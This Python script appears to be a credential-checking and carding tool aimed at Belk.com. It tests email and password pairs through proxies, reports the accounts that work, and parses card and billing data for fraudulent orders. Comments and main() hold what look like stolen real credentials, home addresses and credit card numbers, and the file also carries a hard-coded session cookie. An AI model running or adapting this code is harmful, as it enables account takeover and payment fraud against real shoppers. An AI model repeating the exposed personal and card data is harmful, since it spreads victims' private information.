#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time;
import json, base64
from urllib.parse import unquote, quote, urlencode
from mybrowser import Rqbrowser
import os


class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Belk:
    """ Test reg forum
    """
    def __init__(self):       
        pass
    def site_login(self,email,password):
        r = self.browser.open('https://www.belk.com/login-loginform/')
        html_forms = self.browser.selectForm(r.text)
        login_form = False
        for line_form in html_forms:
            if str(line_form).find('dwfrm_login') != -1:
                login_form = line_form
                break
        input_form = self.browser.getInputForm(login_form)
        data = {}
        for line_key in input_form.keys():
            if line_key:
                if line_key.find('dwfrm_login_username') != -1:
                    data[line_key] = email
                if line_key.find('dwfrm_login_password') != -1:
                    data[line_key] = password
                if line_key.find('csrf_token') != -1:
                    data[line_key] = input_form[line_key]
        data['dwfrm_login_keepmesignedin'] = 'true'
        data['dwfrm_login_login'] = 'My Account'
        
        # action_url = self.browser.getActionUrl(input_form)
        print(data)
        extra_header = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "__cq_dnt=0; dw_dnt=0; _pxhd=UFdowJHOBVy0xe0YMhMSGvOcw-csuy6uwLFBbDIdkCRIkTQ4l9YZeajf-CpbYpzpkzYnIOgMWsSw2dqYXQPKOg==:AfcSI1C8MBRX7knI0rXMqVJj67wB/lG0/d7R7iwv6uSENePSM21OtVE4z3qDfv7iCy5GZUPYGJyIssQmoMkvXj8u5wnwsCtVGdPHJQPGwGg=; dw=1; dw_cookies_accepted=1; GA_Visitor=no; google_criteo_split=criteo; rxVisitor=1665627899656K8T8UK705U3MGEURCNHDHOFG0SVD1MMH; pxcts=5cf5b028-4aa1-11ed-bba2-71546b464e66; _pxvid=5ae7c916-4aa1-11ed-b210-704b4273524a; AMCVS_5211508055C89B1F7F000101%40AdobeOrg=1; __ogfpid=aae47073-e134-4d70-ba37-7dfd56c933f2; s_ecid=MCMID%7C01376200184914564480925717812858768335; s_vnum=1667224800788%26vn%3D1; s_invisit=true; v94_s=First%20Visit; s_cc=true; _scid=360107a9-1835-4b90-be8c-aed8765f3192; _gcl_au=1.1.1192378378.1665629243; _fbp=fb.1.1665629242962.1127651356; _ga=GA1.1.1881859689.1665629243; cjConsent=MHxOfDB8Tnww; cjUser=1c986c20-dbdc-4309-b3b9-3084b3713bb6; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22oNHiuEVHMqHQmLet9XXy%22%7D; mt.sc=%7B%22i%22%3A1665629243917%2C%22d%22%3A%5B%5D%7D; mt.v=2.2141348840.1665629243920; _pin_unauth=dWlkPU1USXdaVFkzWm1NdE1UUXhNQzAwWlRFMkxXSTFOV1V0WVRObE0yVTROR1kzWlRkag; _sctr=1|1665583200000; cimcid=27075a7f-74e5-4c1f-8a47-768cd762e653; bounceClientVisit4714v=N4IgNgDiBcIBYBcEQM4FIDMBBNAmAYnvgO6kB0ARgKZgDWZAxgPYC2RYTA5gJYB2AtBx68AZkwBObAiAA0IcTBCyQ3FAH1OTNSiooU3JrxgiAhmB1zVGiNt37DxszoC+QA; mdLogger=false; kampyle_userid=3b80-e159-a290-e78a-3107-c1c0-a002-0995; dtCookie=v_4_srv_3_sn_6SOBLNTSOG022PH891UAKE91JL61UPP9_app-3A3a8816622c23c645_1_ol_0_perc_100000_mul_1_rcs-3Acss_0; belkRewardStatus=Tm9uZQ==; amp_365902=zS4BO9z11Q_My8fJFa7pxv...1gf7jqsf1.1gf7jqsf5.0.2.2; amp_f24a38=JKE8Y5Z57Qs7m7PPHC1edl...1gf7jqsg1.1gf7jqsg1.0.0.0; a1ashgd=rd8q8xouzk000000rd8q8xouzk000000; _uetsid=64ad98204aa111eda37f51f989123ace; _uetvid=64add8504aa111edb2837312449c98ee; RES_TRACKINGID=14044118855292656; ResonanceSegment=1; RES_SESSIONID=96447428855292656; _clck=jqym1k|1|f5o|0; _clsk=1fn5she|1665629258173|1|0|n.clarity.ms/collect; kampylePageLoadedTimestamp=1665629258309; _derived_epik=dj0yJnU9bUdMNEFmcklsNHRaSTJEVVNueEJuellRUHB6dDJiak0mbj1ncXRqWDk5WThxMW9pSDFZSTNOaGNBJm09NCZ0PUFBQUFBR05IZmtZJnJtPTQmcnQ9QUFBQUFHTkhma1k; __gads=ID=3703c37a9bd58208:T=1665629767:S=ALNI_MaGCwQ7GgOqAS25SIC3t0zit4LCQg; __gpi=UID=00000b60407ee353:T=1665629767:RT=1665629767:S=ALNI_MYXQkkpOMmvnxrKYbaRi4dGlKnQ5g; sid=ANonREiCIXgAtMEwrrKqpMVHpHvfZPeKy0Q; encCustNumber=\"\"; dwsid=sN2got7xFllFVPCyV_95LXVAI51JF8CrjqTr0gmhctsm7ns9jYJy-D7H7qINK_Lx-i31PB5dZtsvU1hyFgdd1A==; dwanonymous_a58257d7a8c8c52704fa91f850837017=ac8McakNOufZDjdvFTbVgJ0FxD; dwac_f41c28f829e7cd8614caac57be=ANonREiCIXgAtMEwrrKqpMVHpHvfZPeKy0Q%3D|dw-only|||USD|false|US%2FEastern|true; AMCV_5211508055C89B1F7F000101%40AdobeOrg=1585540135%7CMCIDTS%7C19279%7CMCMID%7C01376200184914564480925717812858768335%7CMCAAMLH-1666234572%7C8%7CMCAAMB-1666234572%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1665636972s%7CNONE%7CMCAID%7CNONE%7CMCCIDH%7C-387318031%7CvVersion%7C4.4.0; belkdwsid=sN2got7xFllFVPCyV_95LXVAI51JF8CrjqTr0gmhctsm7ns9jYJy-D7H7qINK_Lx-i31PB5dZtsvU1hyFgdd1A==; c35=wishlist%3Amyaccount; c36=wishlist; _pxff_cc=U2FtZVNpdGU9TGF4Ow==; _pxff_rf=1; _pxff_fp=1; kampyleUserSession=1665631079897; kampyleUserSessionsCount=2; kampyleUserPercentile=86.08485954156623; visit_page_count=2; utag_main=v_id:0183cf3d431c0016ee7e693bfb8005075002506d00c9e$_sn:1$_se:12$_ss:0$_st:1665632902565$ses_id:1665629242142%3Bexp-session$_pn:9%3Bexp-session$vapi_domain:belk.com$dc_visit:1$dc_event:12%3Bexp-session$dc_region:ap-southeast-2%3Bexp-session; dtLatC=5; _br_uid_2=uid%3D8426964622372%3Av%3D12.0%3Ats%3D1665629244422%3Ahc%3D9; _ga_QFXGMQ84QB=GS1.1.1665629243.1.1.1665631103.1.0.0; _px2=eyJ1IjoiYjE2ODExMDAtNGFhNS0xMWVkLWFmZmQtMWY5MGY2YTk2MGIwIiwidiI6IjVhZTdjOTE2LTRhYTEtMTFlZC1iMjEwLTcwNGI0MjczNTI0YSIsInQiOjE2NjU2MzE0MDM5MDAsImgiOiJiOWEzZjZjMGFkNzMzODg0NDRjYjA0YzcxOGFhMDhkNzAwMjg1NDhjMzVmMzE3Nzg2MDgzNjA2MjU5MWYyZjYyIn0=; rxvt=1665631562328|1665627899659; s_ppvl=wishlist%253Amyaccount%2C86%2C83%2C973%2C1296%2C973%2C2048%2C1152%2C2%2CP; s_ppv=wishlist%253Amyaccount%2C84%2C84%2C973%2C1296%2C973%2C2048%2C1152%2C2%2CP; dtPC=3$29759845_299h-vMCVFAGKQKHPDFMUVKKJKCPKPAOUAWRHE-0e0; kampyleSessionPageCounter=3; fs_i=SDNfkWjcdY; shq=638012279077992532%5E0183cf3d-5ed3-4301-96f2-4194d6dfe0ee%5E0183cf58-df81-4874-abf6-ec68af5c19b7%5E0%5E211.30.39.40; v94=1665631120377; s_sq=belkdotcom%3D%2526c.%2526a.%2526activitymap.%2526page%253Dwishlist%25253Amyaccount%2526link%253DSign%252520In%2526region%253Ddwfrm_login%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dwishlist%25253Amyaccount%2526pidt%253D1%2526oid%253DMy%252520Account%2526oidt%253D3%2526ot%253DSUBMIT; dtSa=true%7CC%7C-1%7CSign%20In%7Ct-0%7C1665629777139%7C29759845_299%7Chttps%3A%2F%2Fwww.belk.com%2Flogin-loginform%2F%7C%7C%7C%7C",
    "Referer": "https://www.belk.com/login-loginform/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
       
        self.browser.add_header('https://www.belk.com/login/?original=%2Faccount%2F', extraHeader=extra_header)
        self.browser.add_cookies_to_header()
        r = self.browser.open('https://www.belk.com/login-loginform/', data)
        html = r.text
        # # print(html)
        c = open('dien.html', 'w', encoding='utf-8')
        c.write(html)
        if html.find('password-reset') == -1 and html.find('Manage My Account') != -1:
            return email +'|'+ password
        else:
            return


    def change_email_info(self):
        pass


    def update_status(self, status):
        print(status)
        if self.emit:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "updatestatus", str(status))
            except:
                pass


    def get_billing_infomation(self, listbilling):
        hangbill = listbilling.split('|')
        self.bfirstname = hangbill[0].strip()
        self.blastname = hangbill[1].strip()
        self.baddress1 = hangbill[2].strip()
        self.baddress2 = hangbill[3].strip()
        self.bcity = hangbill[4].strip()
        self.bstate = hangbill[5].strip()
        self.bzipcode = hangbill[6].strip()


    #################################
    def get_shipping_infomation(self, shipping_address):
        if shipping_address.find('|') != -1:
            hangdrop = shipping_address.split('|')
            self.sfirstname = hangdrop[0].strip()
            self.slastname = hangdrop[1].strip()
            self.saddress1 = hangdrop[2].strip()
            self.saddress2 = hangdrop[3].strip()
            self.scity = hangdrop[4].strip()
            self.sstate = hangdrop[5].strip().upper()
            self.szipcode = hangdrop[6].strip()
            if self.szipcode.find('-') != -1:
                self.szipcode = self.szipcode.split('-')[0].strip()
            THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
            my_file = os.path.join(THIS_FOLDER, 'us_phone.db')
            sphoneopen = open(my_file)
            listsphone = sphoneopen.read()
            list_phone = listsphone.split('\n')
            min = 0
            max = len(list_phone) - 1
            ran_phone = random.randint(min, max)
            dau = 1000000
            cuoi = 9999999
            phone_them = random.randint(dau, cuoi)
            self.sphone = list_phone[ran_phone].strip().split('|')[0].strip() + str(phone_them)


            self.sphone1 = self.sphone[:3]
            self.sphone2 = self.sphone[3:6]
            self.sphone3 = self.sphone[6:]
            alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            min = 8
            max = 16
            stringimg = ''
            list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                           'yahoo.com', 'aol.com', 'live.com']
            mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
            for x in random.sample(alphabet, random.randint(min, max)):
                stringimg += x
            username_chuan = stringimg
            # print checkout_form
            self.email_chuan = username_chuan + '@' + mail_domain
            return True

    def get_card_infomation(self, list_card):
        hangcard = list_card.split('|')
        self.ccnum = hangcard[0].strip()
        self.ccmonth = hangcard[1].strip()
        self.ccyear = hangcard[2].strip()
        self.ccv = hangcard[3].strip()

    def check_item_information(self,item_information):
        if item_information.find('|') != -1 and item_information.split('|')[3].isdigit() and len(
                item_information) >= 4:

            return item_information

        elif item_information.find('|') == -1:

            return item_information + '|||1'

    def get_item_information(self, item_information):
        #tem_id_link + '|' + size + '|' + color + '|' + quantity
        self.list_item_link = []
        if item_information.find('http') != -1:
            if item_information.find('&&') != -1 and item_information.find('|') != -1:
                for line_item_information in item_information.split('&&'):
                    # print(line_item_information)
                    item_info = self.check_item_information(line_item_information)
                    if item_info:
                        # print(item_info)
                        self.list_item_link.append(item_info)
            else:
                item_info = self.check_item_information(item_information)
                if item_info:
                    self.list_item_link.append(item_info)
        self.update_status('Total Item:'+str(len(self.list_item_link)))
        return self.list_item_link

    def add_item_to_cart(self, item_link, size, color, quantity):
        pass
    def create_account(self):

        pass

    def go_to_input_shipping(self):
        pass

    def clear_shopping_bag(self):
        pass

    def submit_order(self, macys_card, cardId=''):
        pass

    def check(self, email='', password='', username='', sock5='', proxy=''):
        self.browser = Rqbrowser()
        if sock5:
            self.browser.set_proxies(sock5=sock5)
        if proxy:
            self.browser.set_proxies(proxy=proxy)
        login = self.site_login(email, password)
        # if login.find('check die') == -1:
            
            # list_info = self.get_info_account_infomation(get_all_card=True)
            # if list_info:
            #     total_info=''

            #     # print list_info
            #     for info in list_info:
            #         total_info=total_info+email+'|'+password+'|'+info['billingAddress']+'|'+info['card_infomation']+'\n'
            #     return total_info.strip()
            # else:
            #     return 'check die:no card'
        return login

    def check_order_status(self, order_number,email_order, sock5='', sock_type='', username='', password=''):
        pass

    def get_macys_card_informaiton(self):
        pass

    def get_info_account_infomation(self,get_all_card=False):
        
        pass

    def get_info_account(self, account_infomation):
        
        pass

    def order(self, shipping_address, card_information=None,account_infomation=None,item_information=None, proxy=None,use_sock5=True):
        """
            item_id = flavors
            color = item
        """
        pass
def main():


    listbilling = 'long|hoang|11407 SW Amu St.Suite #JT907||Tualatin|OR|97062'

    list_address_drop = 'Jiang|Jiang Xiao|11407 SW Amu RD.Suite #UY734||Tualatin|OR|97065'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    ordervr = Belk()
    # item_information = 'https://www.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964'
    # ordervr.order(list_address_drop,account_infomation='cwen.hsieh@gmail.com|6474591|CHINGWEN|HSIEH|394 BEVERLY ST|#A|RENO|NV|89512||450399830640|-1|-1',item_information=item_information,proxy='127.0.0.1:9951')
    # ordervr.site_login('kep328@yahoo.com','london98')
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()
    check = ordervr.check('dinhngockhuong@gmail.com', 'Hanoi123!@#', sock5='')
    print(check)


    # check_status = ordervr.check_order_status('1347527371','DuVEdmcev@yahoo.com',sock='127.0.0.1:9951')
    # print check_status
    #kristinkbuettner@gmail.com | mdgirly1
    #nancy522@gmail.com|vball522|NANCY|VU|1310 S GLENCOE ST||DENVER|CO|80222|MasterCard1176|5466160368911176|1|2021
    #
    # check = ordervr.check('nancy522@gmail.com','vball522',sock5='127.0.0.1:9951')
    # ordervr.get_macys_card_informaiton()
    # print(check)
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order(list_address_drop, listbilling, list_card='372577389342012|03|2016|5512',
    #                        account_infomation='UhrgfhFNRBgS@aol.com|UhrgfhFNRBgS',
    #                        sock='', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='', shipping_info='2 Day', billasship=False)
    # print status
    # ordervr.create_account()
    # ordervr.add_item_to_cart('https://www.macys.com/shop/product/shark-nv358-vacuum-pro-navigator-professional-lift-away?ID=595650','','','1')


if __name__ == "__main__":
    sys.exit(main())
